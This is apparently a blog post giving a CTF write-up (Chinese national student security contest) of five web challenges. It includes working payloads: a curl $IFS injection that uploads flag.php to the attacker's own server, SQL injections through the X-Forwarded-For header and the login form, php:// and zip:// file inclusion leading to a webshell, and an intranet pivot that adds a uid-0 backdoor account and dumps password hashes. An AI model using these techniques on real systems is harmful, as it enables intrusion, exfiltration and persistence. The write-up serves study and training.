---
title: 信息安全国赛技能赛 Writeup
date: 2016-07-12 13:42:28
tags:
- Blogs
- ctf
- access
- 伪协议
- sqli
categories:
- Blogs
---
周末在北京wooyun峰会的旅途上打了一场大学生信息安全的国赛的技能赛，本以为能进的决赛，却因为人手不够再加上个人水平太差错过了，虽然i春秋的平台一股浓浓的国产页游风，但不得不说，题目的质量确实不算差，稍微整理下wp...

<!--more-->


# WEB #

## web150 脚本抢金币 ##

150这题没什么可说，由于验证码比较弱，所以上网找个识别验证码的再写个脚本就好了，贴上队友的脚本

```
#!/usr/bin/env python2
# coding: utf-8

from bs4 import BeautifulSoup
from PIL import Image
import pytesseract
import requests

url = "http://106.75.30.59:8888/game.php"
cookies = dict(PHPSESSID="2cr00id1lh76jgskh4ddlr15m1")

r = requests.get(url, cookies=cookies)
raw_content = r.content
# print raw_content

soup = BeautifulSoup(raw_content, "html5lib")
raw_tr = soup.find_all('tr')
# raw_a_tag = raw_a_tag[1:21]
raw_tr = raw_tr[1:21]

for i in xrange(1,200):
    for tr in raw_tr:
        name = tr.find_all('td')[1].get_text()
        robid = tr.find_all('a')[0].get('href')

        # bypass limit
        url = "http://106.75.30.59:8888/" + robid[2:]
        requests.get(url, cookies=cookies)

        # get code
        url = "http://106.75.30.59:8888/code.php"
        code = requests.get(url, cookies=cookies)
        with open("code.png", "wb") as ff:
            ff.write(code.content)
        img = Image.open("code.png")
        code_string = pytesseract.image_to_string(img)

        # do rob
        data = {
            'user': name,
            'num' : '1000',
            'code': code_string
        }
        r = requests.post('http://106.75.30.59:8888/dorob.php', data=data, cookies=cookies)
        ss = BeautifulSoup(r.content, "html5lib")
        print ss.find_all('h1')[0].get_text()

```

## web200 IFS绕过导致的任意curl ##

fuzz了很久找到了.index.php.swo

改为.swp后缀，新建index.php，vim打开恢复，get源码

```
<?php 

function strreplace($str){ 
	error_reporting(E_ALL || ~E_NOTICE);
	$str = str_replace('+','',$str);
    $str = str_replace('@','',$str);
    $str = str_replace('?','',$str);
    $str = str_replace('!','',$str);
    $str = str_replace('#','',$str);
    $str = str_replace('%','',$str);
    $str = str_replace('}','',$str);
    $str = str_replace('{','',$str);
    $str = str_replace(')','',$str);
    $str = str_replace('(','',$str);
    $str = str_replace(')','',$str);
    $str = str_replace('>','',$str);
    $str = str_replace('&','',$str);
    $str = str_replace('|','',$str);
    $str = str_replace(';','',$str);
    $str = str_replace('`','',$str);
	return $str;
}      

if($_GET[num]<>"")
{ 
	$num = $_GET[num];
	if(strstr($num,'1'))
		die("Sorry");
}
elseif($num <> 1){
{
	echo "Try to num = 1";
}
if($num == 1 ){
	echo "Flag in http://127.0.0.1/flag.php"."</br>";
	$cmd=trim($_GET['cmd']); 
	$cmd=strreplace($cmd);
	system("curl$cmd/flag.php");
	}
}else{echo "It Works!";}

?>
```

第一步没什么可说的其实，php特性，0.99999999999999就会产生小数下标溢出为1。

然后是第二部步，在shell中`$IFS`会被解释为空格，这样就可以巧妙绕过trim的过滤，这样我们就可以使用任意curl命令了，但是尝试了很多办法都和直接访问flag.php是相同的，但是curl可以使用-T来把本地文件上传到ftp服务器，那么我们可以构造向我们的服务器上传文件，这样就可以get flag.php这个文件

payload:
```
ttp://106.75.32.87:16888/index.php?num=0.99999999999999999999999999999999999&cmd=$IFS-T flag.php -a http://xxxx:xx

```
这里的xxxx就是你自己服务器地址，然后再服务器监听xx端口，就可以看到了
```
root@iZ285ei82c1Z:/home/wwwroot/default/test# nc -lvv 20
Listening on [0.0.0.0] (family 0, port 20)
Connection from [106.75.32.87] port 20 [tcp/ftp-data] accepted (family 2, sport 44712)
PUT /flag.php HTTP/1.1
User-Agent: curl/7.35.0
Host: 115.28.78.16:20
Accept: */*
Content-Length: 116
Expect: 100-continue

<?php
echo "Yep,Flag is here,But u cant look in here!";
//flag is here!
//flag{2984bce1807c46879cb80995c7003109}
?>

```

## web300 SQL ##

打开发现登陆和改名的地方都有注入，但是waf比较迷，数据库也不知道，所以第一天完全没有任何思路，给的提示也是迷迷糊糊的，第一天晚上扫目录的时候获得了一个比较重要的信息，在web根目录下存在2.txt log日志(怎么会有这种名字的日志。。。)...

得到了sql语句
```
update userinfo set user='ssss',lasetloginip='111.111.111.111' where utoken='xxxxxxxxx'
```
那么就是xff注入了，构造post请求为
```
user=,info='127.0.0.1
```
修改xff为
```
114.246.76.88',user=DLOOKUP('flag', 'ctf'),email=
```
这里的dlookup真的是找了好久才知道，由于不熟悉access数据库，access数据库中不能直接代入子查询，需要inner join，但是inner join必须在set前...踩了不熟悉的坑..哎...

## web400 phpup ##

打开首先看看文章，文章里提到有admin的登陆界面，偶然发现有个admin的js，按home键就会出现登陆界面，顺藤摸瓜找到一个登陆接口，这个接口开着报错而且没有任何过滤，除了不能回显以外什么都可以，那么sqlmap都可以跑...

有个问题是from被过滤了，那么只能注当前表，可惜密码解不开，但是我们可以巧妙绕过

```
username=' union select '0cc175b9c0f1b6a831c399e269772661'%23
&password=a
```

发现了admininfile.php文件，有文件包含漏洞
```
http://106.75.30.59:2333/admin/admininfile.php?name=php://filter/read=convert.base64-encode/resource=upload
```
得到源码
```
upload.php
<?php
	require_once '../connect.php';
	checkLogined();
	if($_FILES){
		$upfile=$_FILES["file"]["name"];
		$fileTypes=array(
				'jpg', 'png','gif','zip','rar','txt');

		function getFileExt($file_name) {
			while($dot = strpos($file_name, ".")) {
				$file_name = substr($file_name, $dot+1);
			}
			return $file_name;
		}
		$test1= strtolower(getFileExt($upfile));
		if(!in_array($test1, $fileTypes)) 
		{

			exit();
		}
		else{
			$nfile=md5(rand(10,1000).time()).".".$test1;
			move_uploaded_file($_FILES["file"]["tmp_name"], "../file123asdp/" . $nfile);
			echo "ok!<a href=../file123asdp/".$nfile.">$nfile</a>";
		}
	}
?>

```
还有admininfile.php
```
admininfile.php
<?php
	$file=$_GET['name'].'.php';
	if(!file_exists($file)){
		echo $file." not exists!";
	}
	include($file);
?>

```

看别人的wp发现有很多都是这届读了../flag.php的文件，但是这里其实可以拿shell的，看到上传有zip就想到zip伪协议,构造shell，放在zip文件中，可以用zip://访问shell

payload
```
http://106.75.30.59:2333/admin/admininfile.php?name=zip://../file123asdp/7b3b30bc
74aa1bd666dc94c37af0a465.zip%23test
```


## web500 内网渗透 ##

i春秋提供了一个很傻的内网环境，而且工具都是什么奇奇怪怪的东西，第一个web服务优势tomcat。。。没办法，尝试几次都没找到突破口，直接都没做出来...

研究下别人的wp

首先第一台web服务是tomcat
拿web目录扫描器扫了下，看到了admin.htm，在这个页面找到几个action，用st2工具试了下，有S2-032漏洞，然后上传个jsp shell，用菜刀连上去，用菜刀的命令行执行工具添加了一个root账号的密码：
```
useradd -ou 0 -g 0 aaa;echo aaa:aaa|chpasswd
```

然后目标是13.2,
访问到13.2，13.2的web界面是个HFS，用远程代码执行漏洞，添加个账号，然后再用putty把13.2的3389转发出来登上去，把cain用RDP磁盘共享的办法传上去，dump出来13.2的所有账户的hash，去网上界面，把administrator和zhangsan的密码都解出来了，然后发现zhangsan的密码可以登陆13.3，但是提示没有RDP登陆的权限，于是先用pstools连接上13.3执行cmd，把administrator的密码改了，登陆13.3，然后打开firefox，在历史记录里面看到了13.1网关的登陆记录，密码也保存在13.3的浏览器里面了，然后登陆13.1，把所有LAN段都设置成互相可以通信，退出来在11.2里面就可以访问14.2了

最后退回到14.2
用zhangsan的账号再登陆13.2，发现桌面有个txt，里面提到了一个github地址，访问发现一个web的源码
`https://github.com/1033/apptest`
正是14.2web的源码，可以上传文件，但是过滤了jsp的后缀名，不过我们可以上传jspx的文件，于是在11.2里面用手写出来一个jspx webshell，成功上传获取到flag.